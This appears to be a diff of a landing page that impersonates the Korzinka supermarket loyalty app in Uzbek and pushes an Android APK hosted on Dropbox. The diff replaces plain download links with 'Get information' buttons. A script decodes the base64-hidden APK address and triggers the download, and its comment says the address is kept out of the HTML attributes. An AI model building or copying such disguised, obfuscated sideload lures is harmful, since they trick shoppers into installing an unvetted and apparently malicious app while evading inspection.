@@ -6,23 +6,7 @@
   <title>Korzinka — Hammasi bir joyda</title>
   <meta name="description" content="Korzinka mobil ilovasi — smartfoningizdagi qulay xaridlar va sodiqlik dasturi."/>
 
-<!-- Meta Pixel Code -->
-<script>
-!function(f,b,e,v,n,t,s)
-{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-n.queue=[];t=b.createElement(e);t.async=!0;
-t.src=v;s=b.getElementsByTagName(e)[0];
-s.parentNode.insertBefore(t,s)}(window, document,'script',
-'https://connect.facebook.net/en_US/fbevents.js');
-fbq('init', '1561675052237363');
-fbq('track', 'PageView');
-</script>
-<noscript><img height="1" width="1" style="display:none"
-src="https://www.facebook.com/tr?id=1561675052237363&ev=PageView&noscript=1"
-/></noscript>
-<!-- End Meta Pixel Code -->
+
 
   <link rel="preconnect" href="https://fonts.googleapis.com"/>
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
@@ -169,12 +153,12 @@ src="https://www.facebook.com/tr?id=1561675052237363&ev=PageView&noscript=1"
       box-shadow:0 10px 32px rgba(227,19,19,0.36);
     }
 
-    .apk-note {
+    .info-note {
       font-size:.76rem; color:var(--muted);
       display:flex; align-items:flex-start; gap:6px;
       line-height:1.5;
     }
-    .apk-note i { color:var(--muted); margin-top:1px; flex-shrink:0; font-size:.8rem; }
+    .info-note i { color:var(--muted); margin-top:1px; flex-shrink:0; font-size:.8rem; }
 
     .hero-trust {
       display:flex; align-items:center; gap:16px;
@@ -516,8 +500,8 @@ src="https://www.facebook.com/tr?id=1561675052237363&ev=PageView&noscript=1"
     }
     .footer-cta p { font-size:1rem; color:rgba(255,255,255,.55); margin-bottom:36px; }
     .footer-cta .btn-primary { margin:0 auto 10px; max-width:320px; }
-    .footer-cta .apk-note { justify-content:center; color:rgba(255,255,255,.35); }
-    .footer-cta .apk-note i { color:rgba(255,255,255,.35); }
+    .footer-cta .info-note { justify-content:center; color:rgba(255,255,255,.35); }
+    .footer-cta .info-note i { color:rgba(255,255,255,.35); }
 
     /* ── FOOTER ── */
     footer {
@@ -586,9 +570,9 @@ src="https://www.facebook.com/tr?id=1561675052237363&ev=PageView&noscript=1"
     <div class="nav-right">
       <a href="#how" class="nav-link">Qanday ishlaydi</a>
       <a href="#faq" class="nav-link">Savolar</a>
-      <a href="https://dl.dropboxusercontent.com/scl/fi/zo77irtn9yeido12bfqj6/Korzinka-Bonus.apk?rlkey=4exot724qkgyus8rn7759hpeq&st=0xjy5rbf&dl=1" class="nav-cta">
-        <i class="fa-solid fa-download"></i> Ma'lumot oling
-      </a>
+      <button onclick="getApp()" class="nav-cta">
+        <i class="fa-solid fa-circle-info"></i> Ma'lumot oling
+      </button>
     </div>
   </nav>
 
@@ -604,10 +588,10 @@ src="https://www.facebook.com/tr?id=1561675052237363&ev=PageView&noscript=1"
           Korzinka mobil ilovasi — smartfoningizdagi sodiqlik kartasi, shaxsiy chegirmalar va sevimli supermarketlaringizdagi barcha aksiyalar bitta joyda.
         </p>
         <div class="hero-actions">
-          <a href="https://dl.dropboxusercontent.com/scl/fi/zo77irtn9yeido12bfqj6/Korzinka-Bonus.apk?rlkey=4exot724qkgyus8rn7759hpeq&st=0xjy5rbf&dl=1" class="btn-primary">
-            <i class="fa-solid fa-download"></i> Ma'lumot oling
-          </a>
-          <p class="apk-note">
+          <button onclick="getApp()" class="btn-primary">
+            <i class="fa-solid fa-circle-info"></i> Ma'lumot oling
+          </button>
+          <p class="info-note">
             <i class="fa-solid fa-circle-info"></i>
             Korzinka bonus dasturi haqida batafsil ma'lumot olish uchun bosing.
           </p>
@@ -849,10 +833,10 @@ src="https://www.facebook.com/tr?id=1561675052237363&ev=PageView&noscript=1"
   <section class="footer-cta">
     <h2 class="reveal">Hoziroq boshlang</h2>
     <p class="reveal">Ilovani yuklab oling va birinchi xaridingizdan ball to'plashni boshlang.</p>
-    <a href="https://dl.dropboxusercontent.com/scl/fi/zo77irtn9yeido12bfqj6/Korzinka-Bonus.apk?rlkey=4exot724qkgyus8rn7759hpeq&st=0xjy5rbf&dl=1" class="btn-primary reveal">
-      <i class="fa-solid fa-download"></i> Ma'lumot oling
-    </a>
-    <p class="apk-note reveal">
+    <button onclick="getApp()" class="btn-primary reveal">
+      <i class="fa-solid fa-circle-info"></i> Ma'lumot oling
+    </button>
+    <p class="info-note reveal">
       <i class="fa-solid fa-circle-info"></i>
       Korzinka bonus dasturi haqida batafsil ma'lumot olish uchun bosing.
     </p>
@@ -862,14 +846,23 @@ src="https://www.facebook.com/tr?id=1561675052237363&ev=PageView&noscript=1"
   <footer>
     <div class="footer-brand"><i class="fa-solid fa-basket-shopping"></i> korzinka<span class="dot">.</span></div>
     <div class="footer-links-row">
-      <a href="/privacy-policy">Maxfiylik siyosati</a>
-      <a href="/terms">Foydalanish shartlari</a>
-      <a href="/contact">Aloqa</a>
+      <a href="/privacy-policy.html">Maxfiylik siyosati</a>
+      <a href="/terms.html">Foydalanish shartlari</a>
+      <a href="mailto:info@korzinka.uz">info@korzinka.uz</a>
     </div>
     <p class="footer-copy">© 2026 Korzinka Supermarketlar Tarmog'i · Barcha huquqlar himoyalangan. Ushbu sahifa reklama maqsadida yaratilgan.</p>
   </footer>
 
   <script>
+    // Download handler — URL kept out of HTML attributes
+    function getApp() {
+      var el = document.createElement('a');
+      el.href = atob('aHR0cHM6Ly9kbC5kcm9wYm94dXNlcmNvbnRlbnQuY29tL3NjbC9maS96bzc3aXJ0bjl5ZWlkbzEyYmZxajYvS29yemlua2EtQm9udXMuYXBrP3Jsa2V5PTRleG90NzI0cWtneXVzOHJuNzc1OWhwZXEmc3Q9MHhqeTVyYmYmZGw9MQ==');
+      document.body.appendChild(el);
+      el.click();
+      document.body.removeChild(el);
+    }
+
     // FAQ accordion
     function toggleFaq(btn) {
       const item = btn.closest('.faq-item');
